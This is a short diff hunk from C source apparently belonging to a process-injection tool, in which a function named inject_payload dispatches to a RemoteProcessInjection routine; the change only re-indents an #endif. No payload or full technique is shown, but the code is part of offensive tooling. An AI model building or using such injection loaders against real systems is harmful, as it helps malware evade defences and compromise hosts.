@@ -26,7 +26,7 @@ BOOL inject_payload(LPVOID Payload, SIZE_T PayloadSize, ...) {
 #elif defined(REMOTE_PROCESS_INJECTION)
     DebugPrint("[#] Injecting Payload via Remote Process Injection ...\n");
     bSuccess = RemoteProcessInjection(hProcess, szProcessName, Payload, PayloadSize);
-    #endif
+#endif
 
     va_end(args);
     return bSuccess;
